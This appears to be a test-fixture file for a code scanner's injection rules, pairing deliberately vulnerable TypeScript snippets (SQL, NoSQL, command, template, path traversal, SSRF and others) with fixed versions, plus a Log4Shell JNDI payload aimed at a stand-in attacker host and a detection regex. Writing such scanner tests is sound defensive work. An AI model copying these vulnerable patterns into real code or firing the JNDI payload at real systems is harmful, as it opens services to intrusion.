import type { RuleCase } from "./types.js";

export const cases: RuleCase[] = [
  {
    ruleId: "XXE_ENTITY_PARSING",
    check: "injection-deep",
    positive: {
      file: "src/xml/upload-parser.ts",
      content: `import { XMLParser } from "fast-xml-parser";\n\nexport function parseUploadedXml(req, res) {\n  const parser = new XMLParser();\n  const result = parser.parse(req.body.xml);\n  res.json(result);\n}\n`
    },
    negative: {
      file: "src/xml/upload-parser.ts",
      content: `import { XMLParser } from "fast-xml-parser";\n\nexport function parseUploadedXml(req, res) {\n  const parser = new XMLParser({ processEntities: false, ignoreAttributes: false });\n  const result = parser.parse(req.body.xml);\n  res.json(result);\n}\n`
    },
    note: "The rule's own unsafe-filter checks for 'processEntities: false' on the same construction line; this is the documented safe option, not a same-line trick — the regex is single-line by design here."
  },
  {
    ruleId: "SSTI_TEMPLATE_COMPILE",
    check: "injection-deep",
    positive: {
      file: "src/views/profile.ts",
      content: `import ejs from "ejs";\n\nexport function renderProfile(req, res) {\n  const html = ejs.render(req.body.template, { user: req.user });\n  res.send(html);\n}\n`
    },
    negative: {
      file: "src/views/profile.ts",
      content: `import ejs from "ejs";\nimport fs from "fs";\n\nconst profileView = fs.readFileSync("views/profile.ejs", "utf8");\n\nexport function renderProfile(req, res) {\n  const html = ejs.render(profileView, { name: req.body.name });\n  res.send(html);\n}\n`
    },
    note: "Negative loads a static precompiled template from disk and only passes user data as context — structurally different from compiling the template source itself from user input."
  },
  {
    ruleId: "SSTI_TEMPLATE_COMPILE_INDIRECT",
    check: "injection-deep",
    positive: {
      file: "src/views/bio.ts",
      content: `import Handlebars from "handlebars";\n\nexport function renderBio(req, res) {\n  const tpl = req.body.template;\n  const compiled = Handlebars.compile(tpl);\n  res.send(compiled({ user: req.user }));\n}\n`
    },
    negative: {
      file: "src/views/bio.ts",
      content: `import Handlebars from "handlebars";\n\nconst bioTemplate = Handlebars.compile("<p>{{name}}</p>");\n\nexport function renderBio(req, res) {\n  const name = req.body.name;\n  res.send(bioTemplate({ name }));\n}\n`
    },
    note: "Two-pass rule: pass 1 extracts the variable name from `const X = req....`, pass 2 checks for that exact name flowing into a compile() call. Positive uses matching name 'tpl' across both lines. Negative's req.-derived variable ('name') is only ever used as render context, never as the compile() argument, so the cross-line variable-name join never matches."
  },
  {
    ruleId: "PROTOTYPE_POLLUTION",
    check: "injection-deep",
    positive: {
      file: "src/settings/update.ts",
      content: `import _ from "lodash";\n\nexport function updateSettings(req, res) {\n  const config = {};\n  _.merge(config, req.body);\n  res.json(config);\n}\n`
    },
    negative: {
      file: "src/settings/update.ts",
      content: `import _ from "lodash";\nimport { z } from "zod";\n\nconst settingsSchema = z.object({ theme: z.string() });\n\nexport function updateSettings(req, res) {\n  const safeInput = settingsSchema.parse(req.body);\n  const config = Object.create(null);\n  Object.assign(config, safeInput);\n  res.json(config);\n}\n`
    },
    note: "Negative validates req.body with a Zod schema first, then merges the validated result (not req.body itself) into a null-prototype target — the merge call's second argument no longer starts with req./body./params./query./user./payload./data., so the rule's own argument-position check never fires."
  },
  {
    ruleId: "PROTOTYPE_POLLUTION_JSON_PARSE",
    check: "injection-deep",
    positive: {
      file: "src/prefs/apply.ts",
      content: `export function applyPreferences(req, res) {\n  const parsed = JSON.parse(req.body.preferences);\n  const config = {};\n  Object.assign(config, parsed);\n  res.json(config);\n}\n`
    },
    negative: {
      file: "src/prefs/apply.ts",
      content: `import { z } from "zod";\n\nconst prefsSchema = z.object({ theme: z.string() });\n\nexport function applyPreferences(req, res) {\n  const parsed = JSON.parse(req.body.preferences);\n  const safePrefs = prefsSchema.parse(parsed);\n  const config = Object.create(null);\n  Object.assign(config, safePrefs);\n  res.json(config);\n}\n`
    },
    note: "Two-pass rule: pass 1 extracts the variable assigned from JSON.parse(req....), pass 2 searches for that variable name inside an Object.assign/merge call. Positive's 'parsed' flows straight into Object.assign. Negative schema-validates 'parsed' into a new variable 'safePrefs' before merging, so the variable-name join from pass 1 never appears inside the merge call."
  },
  {
    ruleId: "NOSQL_OPERATOR_INJECTION",
    check: "injection-deep",
    positive: {
      file: "src/routes/user.ts",
      content: `export async function getUser(req, res) {\n  const user = await User.findOne(req.body);\n  res.json(user);\n}\n`
    },
    negative: {
      file: "src/routes/user.ts",
      content: `import { z } from "zod";\n\nconst lookupSchema = z.object({ username: z.string() });\n\nexport async function getUser(req, res) {\n  const { username } = lookupSchema.parse(req.body);\n  const user = await User.findOne({ username });\n  res.json(user);\n}\n`
    },
    note: "Negative extracts and validates a single named field before querying, so findOne() is called with a plain object literal, never with req.body/params./query. directly, which is exactly what the regex requires immediately after the Mongo method call."
  },
  {
    ruleId: "CRLF_INJECTION",
    check: "injection-deep",
    positive: {
      file: "src/routes/echo.ts",
      content: `export function echoHeader(req, res) {\n  res.setHeader("X-Echo", req.query.value);\n  res.end("ok");\n}\n`
    },
    negative: {
      file: "src/routes/echo.ts",
      content: `export function echoHeader(req, res) {\n  const ALLOWED_VALUES = new Set(["light", "dark"]);\n  const theme = req.query.theme;\n  const safeTheme = ALLOWED_VALUES.has(theme) ? theme : "light";\n  res.setHeader("X-Theme", safeTheme);\n  res.end("ok");\n}\n`
    },
    note: "Structurally different fix: the header value is resolved through an allowlist check to a known-safe local variable before res.setHeader, so the call's second argument is never req./body./params./query. as the regex requires — not a same-line sanitizer-word trick."
  },
  {
    ruleId: "YAML_UNSAFE_LOAD",
    check: "injection-deep",
    positive: {
      file: "src/config/load.ts",
      content: `import yaml from "js-yaml";\n\nexport function loadConfig(fileContents) {\n  return yaml.load(fileContents);\n}\n`
    },
    negative: {
      file: "src/config/load.ts",
      content: `import yaml from "js-yaml";\n\nexport function loadConfig(fileContents) {\n  return yaml.load(fileContents, { schema: yaml.FAILSAFE_SCHEMA });\n}\n`
    },
    note: "The rule uses a negative lookahead requiring FAILSAFE_SCHEMA/JSON_SCHEMA/CORE_SCHEMA to be absent from the rest of the yaml.load(...) line; the negative's explicit FAILSAFE_SCHEMA option on the same call disables the lookahead by the rule's own design."
  },
  {
    ruleId: "DESERIALIZE_UNSAFE",
    check: "injection-deep",
    positive: {
      file: "src/session/restore.ts",
      content: `import serialize from "node-serialize";\n\nexport function restoreSession(req, res) {\n  const session = serialize.unserialize(req.body.session);\n  res.json(session);\n}\n`
    },
    negative: {
      file: "src/session/restore.ts",
      content: `import { z } from "zod";\n\nconst sessionSchema = z.object({ userId: z.string() });\n\nexport function restoreSession(req, res) {\n  const session = sessionSchema.parse(JSON.parse(req.body.session));\n  res.json(session);\n}\n`
    },
    note: "Negative uses JSON.parse plus schema validation — none of 'node-serialize.unserialize', '.unserialize(', 'new Function(', or 'eval(' appear anywhere, so no alternative in the regex has any text to match."
  },
  {
    ruleId: "PATH_TRAVERSAL_JOIN",
    check: "injection-deep",
    positive: {
      file: "src/files/download.ts",
      content: `import path from "path";\n\nexport function downloadFile(req, res) {\n  const filePath = path.join(__dirname, "uploads", req.query.filename);\n  res.sendFile(filePath);\n}\n`
    },
    negative: {
      file: "src/files/download.ts",
      content: `import path from "path";\n\nconst ALLOWED_FILES: Record<string, string> = {\n  report: "report.pdf",\n  invoice: "invoice.pdf",\n};\n\nexport function downloadFile(req, res) {\n  const key = req.query.key;\n  const resolvedName = ALLOWED_FILES[key as string];\n  if (!resolvedName) {\n    return res.status(400).end();\n  }\n  const filePath = path.join(__dirname, "uploads", resolvedName);\n  res.sendFile(filePath);\n}\n`
    },
    note: "Structurally different: the actual filename passed to path.join() is resolved from a static allowlist keyed by user input, never the raw user-controlled string itself, so 'req.'/'filename'/etc. never appear inside the path.join(...) call."
  },
  {
    ruleId: "SSRF_USER_URL",
    check: "injection-deep",
    positive: {
      file: "src/webhooks/fetch.ts",
      content: `export async function fetchWebhook(req, res) {\n  const response = await fetch(req.body.webhookUrl);\n  const data = await response.json();\n  res.json(data);\n}\n`
    },
    negative: {
      file: "src/webhooks/fetch.ts",
      content: `const WEBHOOK_TARGETS: Record<string, string> = {\n  slack: "https://hooks.slack.example.com/services/abc",\n  teams: "https://outlook.example.com/webhook/xyz",\n};\n\nexport async function fetchWebhook(req, res) {\n  const provider = req.body.provider;\n  const resolvedUrl = WEBHOOK_TARGETS[provider as string];\n  if (!resolvedUrl) {\n    return res.status(400).end();\n  }\n  const response = await fetch(resolvedUrl);\n  const data = await response.json();\n  res.json(data);\n}\n`
    },
    note: "Structurally different: the URL passed to fetch() is selected from a static allowlist map keyed by a provider id, never a user-supplied URL string — the fetch() argument 'resolvedUrl' matches none of the regex's tainted-argument alternatives."
  },
  {
    ruleId: "COMMAND_INJECTION",
    check: "injection-deep",
    positive: {
      file: "src/ops/diagnostics.ts",
      content: `import { exec } from "child_process";\n\nexport function runDiagnostics(req, res) {\n  exec(req.body.command, (err, stdout) => {\n    res.send(stdout);\n  });\n}\n`
    },
    negative: {
      file: "src/ops/diagnostics.ts",
      content: `import { execFile } from "child_process";\n\nconst ALLOWED_DIAGNOSTICS = new Set(["disk", "memory", "network"]);\n\nexport function runDiagnostics(req, res) {\n  const check = req.body.check;\n  if (!ALLOWED_DIAGNOSTICS.has(check)) {\n    return res.status(400).end();\n  }\n  execFile("/usr/local/bin/diagnostics", [check], (err, stdout) => {\n    res.send(stdout);\n  });\n}\n`
    },
    note: "Negative calls execFile() with a static binary path followed by a literal string/array argument; the regex requires req./body./params./query./input/cmd/command/shell immediately after the opening paren, but the first argument here is a quoted static path, so no alternative matches."
  },
  {
    ruleId: "LOG_INJECTION",
    check: "injection-deep",
    positive: {
      file: "src/auth/login.ts",
      content: `export function handleLogin(req, res) {\n  console.log("Login attempt for user: " + req.body.username);\n  res.send("ok");\n}\n`
    },
    negative: {
      file: "src/auth/login.ts",
      content: `export function handleLogin(req, res) {\n  const userId = Number(req.body.userId);\n  console.log("Login attempt for user id:", userId);\n  res.send("ok");\n}\n`
    },
    note: "Structurally different: only a coerced numeric id (never a free-text field) is logged, and the console.log(...) call's own arguments contain no req./body./params./query./headers./user./username/email/ip token."
  },
  {
    ruleId: "OPEN_REDIRECT",
    check: "injection-deep",
    positive: {
      file: "src/routes/logout.ts",
      content: `export function handleLogout(req, res) {\n  res.redirect(req.query.returnTo);\n}\n`
    },
    negative: {
      file: "src/routes/logout.ts",
      content: `const ALLOWED_REDIRECTS = new Set(["/dashboard", "/settings"]);\n\nexport function handleLogout(req, res) {\n  const dest = req.query.returnTo;\n  if (typeof dest === "string" && ALLOWED_REDIRECTS.has(dest)) {\n    res.redirect(dest);\n  } else {\n    res.redirect("/");\n  }\n}\n`
    },
    note: "Both res.redirect() calls take a local variable ('dest') or literal ('/') as their argument, never req./body./params./query./etc. directly — 'dest' also does not match the literal token 'destination' in the regex's alternation."
  },
  {
    ruleId: "REDOS_USER_REGEXP",
    check: "injection-deep",
    positive: {
      file: "src/search/items.ts",
      content: `export function searchItems(req, res, items) {\n  const re = new RegExp(req.query.search);\n  const results = items.filter((i) => re.test(i.name));\n  res.json(results);\n}\n`
    },
    negative: {
      file: "src/search/items.ts",
      content: `export function searchItems(req, res, items) {\n  const term = req.query.search;\n  const results = items.filter(\n    (i) => typeof term === "string" && i.name.toLowerCase().includes(term.toLowerCase())\n  );\n  res.json(results);\n}\n`
    },
    note: "Structurally different: substring search via String.includes() instead of constructing a RegExp at all — 'new RegExp(' never appears in the file, so the rule has nothing to match."
  },
  {
    ruleId: "LOG4SHELL_JNDI_LITERAL",
    check: "injection-deep",
    positive: {
      file: "src/security/known-payloads.ts",
      content: `export const knownAttackPayloads = [\n  "\${jndi:ldap://attacker.example.com/a}",\n];\n`
    },
    negative: {
      file: "src/security/known-payloads.ts",
      content: `export const jndiDetectionPattern = /\\$\\{jndi/i;\n\nexport function containsJndiPayload(value: string): boolean {\n  return jndiDetectionPattern.test(value);\n}\n`
    },
    note: "The rule matches the literal substring '${jndi:' anywhere in a line. The negative stores only an escaped regex source (\\$\\{jndi, with no colon and no live template-literal syntax) used to detect such payloads — the exact three-character run '${jndi:' never appears in the file."
  },
  {
    ruleId: "SQL_INJECTION",
    check: "injection-deep",
    positive: {
      file: "src/db/users.ts",
      content: `export function getUserById(db, req) {\n  const query = \`SELECT * FROM users WHERE id = \${req.query.id}\`;\n  return db.query(query);\n}\n`
    },
    negative: {
      file: "src/db/users.ts",
      content: `export function getUserById(db, req) {\n  const query = "SELECT * FROM users WHERE id = ?";\n  return db.query(query, [req.query.id]);\n}\n`
    },
    note: "Positive interpolates the unquoted numeric id directly into the template literal (no quote characters between SELECT and \\${, satisfying the [^'\";\\n]*\\$\\{ span). Negative uses a '?' placeholder with the value passed as a bound parameter — no '\\${' ever appears after a SQL keyword."
  },
  {
    ruleId: "SQL_INJECTION_CONCAT",
    check: "injection-deep",
    positive: {
      file: "src/db/users-concat.ts",
      content: `export function getUserById(db, req) {\n  const query = 'SELECT * FROM users WHERE id = ' + req.query.id;\n  return db.query(query);\n}\n`
    },
    negative: {
      file: "src/db/users-concat.ts",
      content: `export function getUserById(db, req) {\n  const query = "SELECT * FROM users WHERE id = ?";\n  return db.query(query, [req.query.id]);\n}\n`
    },
    note: "Positive's single-quoted JS string ends exactly at the SQL keyword span with a quote character directly followed by '+ req.query.id', matching [^'\";\\n]*['\"]\\s*\\+\\s*req\\.. Negative has no '+' concatenation at all — the parameter is bound via the driver's array argument."
  },
  {
    ruleId: "ORM_RAW_INJECTION",
    check: "injection-deep",
    positive: {
      file: "src/db/prisma-raw.ts",
      content: `export async function getUserRaw(prisma, req) {\n  const users = await prisma.$queryRaw(\`SELECT * FROM users WHERE name = '\${req.query.name}'\`);\n  return users;\n}\n`
    },
    negative: {
      file: "src/db/prisma-raw.ts",
      content: `export async function getUserRaw(prisma, req) {\n  const users = await prisma.$queryRaw\`SELECT * FROM users WHERE name = \${req.query.name}\`;\n  return users;\n}\n`
    },
    note: "Per the module's own inline comment, $queryRaw used as a tagged template (no parentheses — Prisma parameterizes these automatically) is intentionally excluded; only the function-call form '$queryRaw(' matches the regex, and the negative never writes '$queryRaw('."
  },
  {
    ruleId: "NOSQL_AGGREGATE_INJECTION",
    check: "injection-deep",
    positive: {
      file: "src/db/search-users.ts",
      content: `export async function searchUsers(db, req) {\n  const users = await db.collection("users").find({ $where: "this.age > " + req.query.minAge });\n  return users;\n}\n`
    },
    negative: {
      file: "src/db/search-users.ts",
      content: `export async function searchUsers(db, req) {\n  const minAge = Number(req.query.minAge);\n  const users = await db.collection("users").find({ age: { $gt: minAge } });\n  return users;\n}\n`
    },
    note: "Positive's .find({ $where: ... }) matches the same-line \\.find\\s*\\(\\s*\\{[^}]*\\$where check. Negative uses the native $gt operator with a coerced number — the literal substring '$where' (and '$function'/'$accumulator'/aggregate-file correlation) never appears anywhere in the file."
  }
];
